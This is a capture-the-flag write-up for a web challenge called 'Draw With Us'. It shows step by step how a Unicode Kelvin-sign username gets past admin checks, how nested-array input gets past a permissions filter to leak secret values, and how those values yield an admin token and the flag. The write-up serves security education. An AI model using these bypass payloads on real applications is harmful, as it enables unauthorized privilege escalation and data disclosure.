# Draw With Us

## Challenge

<img src="https://i.imgur.com/1imiCXO.png"/>

[stripped.js](https://ctfx.hacktm.ro/download?file_key=ce09444dba18b75e6c3af1ac63a4c65e175cedd46958433089b06fa85e90bba2&team_key=0f6267bf2c756b2ba7567b44cc440e528e713daafd49adc5d4188d2931729356)


## Solution

## What's preventing us from getting the flag?

This is the code that returns the flag (`/flag`):

```javascript
  if (req.user.id == 0) {
    res.send(ok({ flag: flag }));
```

`req.user.id` is determined by the value in a signed Json Web Token which is randomly generated by the server at login.
We have to get a signed token with the `id` field is 0. The secret that is used to sign is never exposed so its secure.


The only other place that returns a signed JWT is `/init`:

```javascript
let adminId = pwHash
    .split("")
    .map((c, i) => c.charCodeAt(0) ^ target.charCodeAt(i))
    .reduce((a, b) => a + b);
    
  res.json(ok({ token: sign({ id: adminId }) }));
```

For `adminId` to be 0,  we need `target xor pwHash = 0` which means `target === pwHash`.

* `target` is the md5 sum of `config.n`.
* `pwHash` is the md5 sum of `q*p` which are variables that are given as parameter.

We need to get `config.n`.

-----

Thanksfully `/serverInfo` returns some of the properties of `config`:

```javascript
app.get("/serverInfo", (req, res) => {
  let user = users[req.user.id] || { rights: [] };
  let info = user.rights.map(i => ({ name: i, value: config[i] }));
  res.json(ok({ info: info }));
});
```

The default rights for each user are:

`[ "message", "height", "width", "version", "usersOnline", "adminUsername", "backgroundColor" ]`

We need to add `n` and `p` to our users' rights list.

The method `/updateUser` allows us to send a list of rights to add to our users rights list.

But when we POST `["p", "n"]` we get:

`"You're not an admin!"`

as a response due to the following code:

```javascript
if (!user || !isAdmin(user)) {
  res.json(err("You're not an admin!"));
  return;
}
```

------

## Bypassing isAdmin(u)

```javascript
function isAdmin(u) {
  return u.username.toLowerCase() == config.adminUsername.toLowerCase();
}
```

We need to make `username.toLowerCase() === adminUsername.toLowerCase()`.

If we try to login (`/login`) with the admin username: `hacktm` we get:

`Invalid creds`

Its due to `isValidUser(u)` in `/login`. It checks that:

```javascript
u.username.toUpperCase() !== config.adminUsername.toUpperCase()
````

So we need: 
* `u.username.toUpperCase() !== config.adminUsername.toUpperCase()`
* `username.toLowerCase() === adminUsername.toLowerCase()`

Thankfully unicode provides us with characters that satify this conditaion:
```
"K".toUpperCase() = "K"
"K".toLowerCase() = "k"
```

That means:

`isValidUser("hacKtm")` is `true` and `isAdmin("hacKtm")` is `true` as well!

We POST to `/login`:

```javascript
{
	"username": "hacKtm"
}
```

we get the following JWT:

```javascript
{
"status": "ok",
 "data": {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZiNzRmNWJmLTI0ZTQtNDhkMC1hNjhmLWFhY2RiMzM1MTE2YSIsImlhdCI6MTU4MDc2MTk5MH0.h4YUaSHGEkG1BcuY_Agx0Lt7bU6X779OnOC2dmcat04"
    }
}
```

Now we can update our rights!


But if we try to POST `["p", "n"]` to `/updateUser` we get:

```javascript
{
    "status": "ok",
    "data": {
        "user": {
            "username": "hacKtm",
            "id": "fb74f5bf-24e4-48d0-a68f-aacdb335116a",
            "color": 0,
            "rights": [
                "message",
                "height",
                "width",
                "version",
                "usersOnline",
                "adminUsername",
                "backgroundColor"
            ]
        }
    }
}
```

We didn't get an error! But `n` and `p` weren't added to the list.

That's because of `checkRights(arr)`.

## Bypassing checkRights(arr)

In `/updateUser()`:
```javascript
if (rights.length > 0 && checkRights(rights)) {
   users[uid].rights = user.rights.concat(rights).filter(onlyUnique);
}
```

and `checkRights` returns false because `rights` contains the string `"n"/"p"`.

This took me a long time to solve. But this can be solved given two facts:

1. Javascript uses `toString()` to access object's properties.
2. An array with one element's `toString()` is `toString()` of the element. Ex: ["n"].toString() => "n".

When we POST `[["p"], ["n"]]` to `/updateUser` we get:

```javascript
{
    "status": "ok",
    "data": {
        "user": {
            "username": "hacKtm",
            "id": "fb74f5bf-24e4-48d0-a68f-aacdb335116a",
            "color": 0,
            "rights": [
                "message",
                "height",
                "width",
                "version",
                "usersOnline",
                "adminUsername",
                "backgroundColor",
                [
                    "p"
                ],
                [
                    "n"
                ]
            ]
        }
    }
}
```

The output of `/serverInfo` is:

```javascript
{
    "status": "ok",
    "data": {
        "info": [
            ...
            {
                "name": [
                    "n"
                ],
                "value": "54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979"
            },
            {
                "name": [
                    "p"
                ],
                "value": "192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617"
            }
        ]
    }
}
```

## Getting the flag



Compute `q` using `n/p`  we obtain:

`q =  283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987`

POST `p` and `q` to `/init` and get:

```javascript
{
    "status": "ok",
    "data": {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNzYzMDEzfQ._6WxROQi7O2EtsTP_gIVCfexZdswjR-2VsN4Biq10g8"
    }
}
```

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNzYzMDEzfQ._6WxROQi7O2EtsTP_gIVCfexZdswjR-2VsN4Biq10g8` is the admin's token.

GET `/flag` with the admin's token:

```
{
    "status": "ok",
    "data": {
        "flag": "HackTM{Draw_m3_like_0ne_of_y0ur_japan3se_girls}"
    }
}
```

Submit the flag and get the points!

